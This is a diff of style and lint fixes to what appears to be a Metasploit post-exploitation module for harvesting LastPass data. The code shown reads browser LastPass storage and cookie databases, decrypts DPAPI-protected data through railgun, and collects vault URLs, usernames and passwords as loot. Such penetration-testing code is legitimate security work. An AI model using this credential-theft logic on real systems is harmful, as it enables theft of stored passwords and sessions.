@@ -46,6 +46,11 @@ class MetasploitModule < Msf::Post
               stdapi_sys_process_memory_write
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
@@ -158,7 +163,7 @@ class MetasploitModule < Msf::Post
           account_map[account][browser]['lp_db_path'] = db_paths.first
           account_map[account][browser]['localstorage_db'] = localstorage_path_map[browser] if file?(localstorage_path_map[browser]) || browser.match(/Firefox|IE/)
           account_map[account][browser]['cookies_db'] = cookies_path_map[browser] if file?(cookies_path_map[browser]) || browser.match(/Firefox|IE/)
-          account_map[account][browser]['cookies_db'] = account_map[account][browser]['lp_db_path'].first.gsub('prefs.js', 'cookies.sqlite') if (!account_map[account][browser]['lp_db_path'].blank? && browser == 'Firefox')
+          account_map[account][browser]['cookies_db'] = account_map[account][browser]['lp_db_path'].first.gsub('prefs.js', 'cookies.sqlite') if !account_map[account][browser]['lp_db_path'].blank? && browser == 'Firefox'
         else
           account_map[account].delete(browser)
         end
@@ -372,7 +377,7 @@ class MetasploitModule < Msf::Post
           path = lp_data['localstorage_db'] + system_separator + 'lp.suid'
           data = read_remote_file(path) if file?(path) # Read file if it exists
           data = windows_unprotect(data) if !data.nil? && data.size > 32 # Verify Windows protection
-          loot_path = loot_file(nil, data, "#{browser.downcase}.lastpass.localstorage", 'application/x-sqlite3', "#{account}'s #{browser} LastPass localstorage #{lp_data['localstorage_db']}")
+          loot_file(nil, data, "#{browser.downcase}.lastpass.localstorage", 'application/x-sqlite3', "#{account}'s #{browser} LastPass localstorage #{lp_data['localstorage_db']}")
           account_map[account][browser]['lp_2fa'] = data
         else # Chrome, Safari and Opera
           loot_path = loot_file(lp_data['localstorage_db'], nil, "#{browser.downcase}.lastpass.localstorage", 'application/x-sqlite3', "#{account}'s #{browser} LastPass localstorage #{lp_data['localstorage_db']}")
@@ -530,7 +535,8 @@ class MetasploitModule < Msf::Post
 
         session_cookie_value = result[0][0]
       end
-      return if session_cookie_value.blank?
+
+      next if session_cookie_value.blank?
 
       # Check if cookie value needs to be decrypted
       if Rex::Text.encode_base64(session_cookie_value).match(/^AQAAA.+/) # Windows Data protection API
@@ -633,7 +639,7 @@ class MetasploitModule < Msf::Post
     input.each_byte do |e|
       if e < 128
         output += e.chr
-      elsif (e > 127 && e < 2048)
+      elsif e > 127 && e < 2048
         output += (e >> 6 | 192).chr
         output += (e & 63 | 128).chr
       else
@@ -666,9 +672,9 @@ class MetasploitModule < Msf::Post
       addr = Rex::Text.pack_int64le(mem)
       len = Rex::Text.pack_int64le(data.length)
       ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
-      pData = ret['pDataOut'].unpack('VVVV')
-      len = pData[0] + (pData[1] << 32)
-      addr = pData[2] + (pData[3] << 32)
+      p_data = ret['pDataOut'].unpack('VVVV')
+      len = p_data[0] + (p_data[1] << 32)
+      addr = p_data[2] + (p_data[3] << 32)
     end
 
     return '' if len == 0
@@ -736,7 +742,7 @@ class MetasploitModule < Msf::Post
       encrypted_data = chunk[pointer + 4..pointer + 4 + length - 1]
       label != 'url' ? decrypted_data = decrypt_vault_password(vault_key, encrypted_data) : decrypted_data = [encrypted_data].pack('H*')
       decrypted_data = '' if decrypted_data.nil?
-      vault_data << decrypted_data if (label == 'url' || label == 'username' || label == 'password')
+      vault_data << decrypted_data if label == 'url' || label == 'username' || label == 'password'
       pointer = pointer + 4 + length
     end
 
